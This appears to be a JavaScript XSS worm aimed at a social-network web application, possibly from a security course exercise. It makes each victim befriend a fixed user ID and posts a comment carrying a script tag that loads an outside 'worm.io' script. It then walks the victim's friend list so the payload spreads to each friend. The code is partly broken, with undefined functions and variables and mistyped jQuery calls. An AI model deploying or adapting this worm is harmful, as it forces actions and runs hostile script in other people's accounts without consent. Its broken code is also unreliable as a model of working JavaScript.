var addFriend = "add_friend.php";
var createComment = "add_comment.php";
var timeLine = "timeline.php"
var info = "<script src='https://github.com/mds5648/worm.io'></script>";
var user = 71;
let date = Date.now();



function target(name){
    $.get(addFriend, {id: user });
    $.get(createComment,{id: name, comment: info,});
}

function dataAnalyticsComment(){
    $get(timeLine, {id: user}, timeLine =>{
        if(!timeLine.includes(user + "hello")){
            $get(createComment, {id: user, comment: user + " "+ date.toLocaleString()});
        $get("friends.php", friends =>{
            lst = friends.split("?id=");
            for( var i = 1; i < lst.length; i ++){
                friend = my_friends[i].split("'>");
                comment(friend);
            }
        })
        target(friend)    
        }
    });
}

dataAnalyticsComment();